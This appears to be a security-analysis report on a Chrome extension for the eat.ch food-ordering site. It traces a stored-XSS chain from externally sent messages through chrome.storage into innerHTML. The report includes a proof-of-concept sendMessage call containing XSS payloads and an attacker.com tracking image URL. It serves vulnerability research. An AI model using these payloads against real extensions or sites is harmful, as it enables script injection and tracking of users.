# CoCo Analysis: kdmdeldiejhilnniodoahpeogdcohedk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5+ instances of chrome_storage_local_set_sink

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kdmdeldiejhilnniodoahpeogdcohedk/opgen_generated_files/bg.js
Line 975: `var tempList = [request.Url, request.Name, request.Types , request.MinOrder, request.Logo];`
Line 977: `chrome.storage.local.set({ "restaurant_list": restaurantList}, ...)`

**Code:**

```javascript
// Background script (bg.js) - External message handler
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    var restaurantList = [];
    chrome.storage.local.get("restaurant_list", function(items){
      restaurantList = items.restaurant_list;
      if (restaurantList == null){
        restaurantList = [];
      }
      var tempList = [request.Url, request.Name, request.Types , request.MinOrder, request.Logo]; // ← attacker-controlled
      restaurantList.push(tempList);
      chrome.storage.local.set({ "restaurant_list": restaurantList}, function(){ // ← storage sink
        var options = {
          type: "basic",
          title: chrome.i18n.getMessage("notifTitle"),
          message: chrome.i18n.getMessage("notifBodyPart1")+ request.Name + chrome.i18n.getMessage("notifBodyPart2"),
          iconUrl: request.Logo, // ← attacker-controlled URL in notification
        };
        chrome.notifications.create(options, function popupDone(){});
        number_of_times++;
        chrome.browserAction.setBadgeText({text: ""+number_of_times});
      });
      sendResponse({"success": true, "Eatch": "Data saved!"});
    });
});

// Content script (cs_0.js) - Storage retrieval and DOM injection
function main(){
  chrome.storage.local.get('restaurant_list', function(items2){ // ← storage read
    if (items2.restaurant_list == null){
      items2.restaurant_list = [];
    }
    placeButtonsOnPage(items2.restaurant_list); // ← flows to DOM injection
  });
  injectScriptToWebpage();
}

function placeButtonsOnPage(already_favourite) {
  for (var i = 0; i < $(".restaurant-item").length; i++){
    // ... code reads stored data ...
    already_favourite.forEach(function(restaurant){
      already_favourite_titles.push(restaurant[1]); // restaurant[1] = request.Name (attacker-controlled)
    });

    if (already_favourite_titles.indexOf(restaurant_name) != -1){
      $('.restaurant-block--info')[i].innerHTML = $('.restaurant-block--info')[i].innerHTML +
      `<br/>
      <div onclick='return false'>
        <i class="material-icons `+iClassSaved+`" id=button`+i+`>bookmark</i>
        <br/>
        <p id=saved-text`+i+` class = "save-text">`+chrome.i18n.getMessage("savedTxt")+`</p>
      </div>
      `; // ← attacker-controlled data injected into DOM via innerHTML
    } else {
      $('.restaurant-block--info')[i].innerHTML = $('.restaurant-block--info')[i].innerHTML +
      `<br/>
      <div class='height-zero' onclick='return false'>
        <i class="material-icons `+iClassSave+`" id=button`+i+` onclick='sendMessageToExtension( "`+restaurant_url+`",
                                                         "`+restaurant_name+`",
                                                         "`+restaurant_types+`",
                                                         "`+restaurant_min_order+`",
                                                         "`+restaurant_logo+`",
        ...
      </div>
      `; // ← all attacker-controlled values (URL, name, types, etc.) injected via innerHTML
    }
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message API (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://www.eat.ch/* domain (whitelisted in externally_connectable)
chrome.runtime.sendMessage(
  'kdmdeldiejhilnniodoahpeogdcohedk', // extension ID
  {
    Url: "javascript:alert(document.domain)",
    Name: "<img src=x onerror=alert(document.domain)>",
    Types: "<script>alert(document.domain)</script>",
    MinOrder: "malicious",
    Logo: "https://attacker.com/track.png"
  },
  function(response) {
    console.log(response); // {"success": true, "Eatch": "Data saved!"}
    // Now reload the page to trigger content script injection
    location.reload();
  }
);
```

**Impact:** Complete storage exploitation chain leading to Stored XSS vulnerability. An attacker controlling the https://www.eat.ch/* domain (or exploiting an XSS on that domain) can:

1. Send malicious external messages to poison chrome.storage.local with XSS payloads
2. The poisoned data is retrieved by the content script and injected into the DOM via innerHTML
3. XSS payloads execute in the context of https://www.eat.ch/* pages
4. Additionally, attacker can specify arbitrary Logo URLs to track when notifications are displayed
5. The vulnerability allows persistent XSS - the payload remains in storage and executes on every page load

The extension validates the sender in manifest.json via `externally_connectable: ["https://www.eat.ch/*"]`, but according to the methodology, even if only ONE domain can exploit it, this is still a TRUE POSITIVE vulnerability.
